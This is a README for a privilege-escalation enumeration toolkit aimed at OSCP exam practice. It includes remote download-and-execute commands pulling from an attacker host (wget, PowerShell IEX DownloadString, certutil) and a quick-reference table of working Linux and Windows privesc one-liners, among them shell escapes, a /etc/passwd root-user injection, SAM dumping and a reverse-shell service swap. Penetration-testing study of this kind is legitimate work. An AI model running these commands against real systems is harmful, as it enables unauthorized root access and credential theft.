# Husky Privesc

Lightweight privilege escalation enumerator built for the OSCP exam. Three scripts, three platforms — upload whichever one the target has and run. Checks SUID, sudo, capabilities, crons, credentials, services, token privileges, and flags GTFOBins-exploitable binaries. Results are priority-sorted so you know what to hit first.

Zero dependencies. Pure bash, Python, and PowerShell. Upload and run.

**Part of the [Husky Hacker](https://medium.com/@TheHuskyHacker) toolkit.**

---

## Scripts

| Script | Target OS | Language | When to Use |
|---|---|---|---|
| `privesc.sh` | Linux | Bash | Guaranteed on every Linux box |
| `privesc.py` | Linux | Python 3 | Cleaner output, more checks, GTFOBins DB |
| `privesc.ps1` | Windows | PowerShell | Native on every Windows box |

---

## Quick Start

### Linux Target

```bash
# On your attacker box — serve the scripts
cd husky-privesc && python3 -m http.server 8000

# On the target — pick one
wget http://ATTACKER:8000/privesc.sh && bash privesc.sh
wget http://ATTACKER:8000/privesc.py && python3 privesc.py
```

### Windows Target

```powershell
# Download and run in memory
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER:8000/privesc.ps1')"

# Or transfer and run from disk
certutil -urlcache -f http://ATTACKER:8000/privesc.ps1 C:\Windows\Temp\privesc.ps1
powershell -ep bypass -f C:\Windows\Temp\privesc.ps1
```

### Windows Cheatsheet (from attacker box)

```bash
# Don't need to upload anything — just prints the commands to paste
python3 privesc.py --windows
```

---

## What It Checks

### Linux (privesc.sh & privesc.py)

| Check | What It Finds |
|---|---|
| **System Info** | Kernel version, interesting groups (docker, lxd, sudo, wheel, disk) |
| **Sudo** | NOPASSWD entries, GTFOBins sudo exploits, LD_PRELOAD in env_keep |
| **SUID** | Non-standard SUID binaries cross-referenced against 200+ GTFOBins entries |
| **Capabilities** | cap_setuid, cap_sys_admin, cap_dac_override, and other dangerous caps |
| **Cron Jobs** | Writable cron scripts, wildcard injection, systemd timers |
| **Writable Files** | /etc/passwd, /etc/shadow, /etc/sudoers, PATH directories, service files |
| **Credentials** | .bash_history, .mysql_history, config files (wp-config, .env), SSH keys |
| **Network** | Internal services on 127.0.0.1 (MySQL, Redis, MongoDB, dev apps) |
| **Docker/LXD** | .dockerenv, Docker socket, docker/lxd group membership |
| **NFS** | no_root_squash exports |
| **Misc** | PwnKit (pkexec), writable Python paths, root-owned writable files |

### Windows (privesc.ps1)

| Check | What It Finds |
|---|---|
| **Token Privileges** | SeImpersonate, SeBackup, SeTcb, SeDebug, SeLoadDriver — with exact exploit tool |
| **Groups** | Administrators, Backup Operators, Server Operators, DnsAdmins, Domain Admins |
| **Services** | Unquoted service paths, writable service binaries, reconfigurable services |
| **Scheduled Tasks** | Writable task binaries |
| **AlwaysInstallElevated** | Registry check — if enabled, instant SYSTEM via malicious MSI |
| **Stored Credentials** | cmdkey saved creds, AutoLogon passwords in registry, DPAPI files |
| **PowerShell History** | ConsoleHost_history.txt with password/credential grep |
| **Interesting Files** | SAM/SYSTEM backups, Unattend.xml, password files in user directories |
| **Network** | Internal services on 127.0.0.1 |
| **Installed Software** | Non-default software with version numbers for exploit research |

---

## Output

Both Linux and Windows scripts produce a priority-sorted summary:

```
  ═══════════════════════════════════════════════════
  PRIVESC SUMMARY
  ──────────────────────────────────────────────────
  CRITICAL: 3  HIGH: 5  MEDIUM: 8

  Hit these first:
    [!!!] sudo NOPASSWD: /usr/bin/vim
    [!!!] SUID GTFOBins: /usr/bin/find
    [!!!] /etc/passwd is writable!
  ═══════════════════════════════════════════════════
```

Severity levels:

- **CRITICAL** — direct path to root/SYSTEM. Exploit immediately.
- **HIGH** — strong lead (credentials, writable service files, dangerous groups).
- **MEDIUM** — useful info (internal services, readable configs, version leaks).

---

## GTFOBins Database (Linux)

The Python and Bash scripts include a built-in database of 200+ binaries known to be exploitable via SUID or sudo. When a SUID binary or sudo entry is found, it's checked against this list and the GTFOBins URL is printed:

```
[CRITICAL] SUID GTFOBins: /usr/bin/find
  → https://gtfobins.github.io/gtfobins/find/#suid

[CRITICAL] sudo NOPASSWD: /usr/bin/vim
  → https://gtfobins.github.io/gtfobins/vim/#sudo
```

---

## Privilege Exploit Quick Reference

### Linux

| Finding | Exploit |
|---|---|
| sudo NOPASSWD vim | `sudo vim -c '!bash'` |
| sudo NOPASSWD find | `sudo find / -exec /bin/bash \; -quit` |
| SUID bash | `/usr/bin/bash -p` |
| SUID python | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| Writable /etc/passwd | `echo 'root2:$(openssl passwd -1 pass):0:0::/root:/bin/bash' >> /etc/passwd` |
| Docker group | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| Cron wildcard (tar) | `echo "" > "--checkpoint-action=exec=sh shell.sh"` |
| NFS no_root_squash | Mount on attacker, create SUID binary, execute on target |

### Windows

| Finding | Exploit |
|---|---|
| SeImpersonatePrivilege | `GodPotato.exe -cmd "cmd /c whoami"` |
| SeBackupPrivilege | `reg save HKLM\SAM C:\temp\SAM` → offline hash extract |
| SeTcbPrivilege | `TcbElevation.exe <ServiceName> <cmd>` |
| Unquoted service path | Drop malicious exe in the gap |
| Writable service binary | Replace with reverse shell exe, restart service |
| AlwaysInstallElevated | `msiexec /quiet /qn /i evil.msi` |
| Stored creds (cmdkey) | `runas /savecred /user:admin cmd.exe` |
| SAM/SYSTEM backup | `impacket-secretsdump -sam SAM -system SYSTEM LOCAL` |

---

## Legal

These scripts perform read-only enumeration for authorized penetration testing and security assessments. Always obtain written authorization before running on systems you do not own.

---

## License

MIT
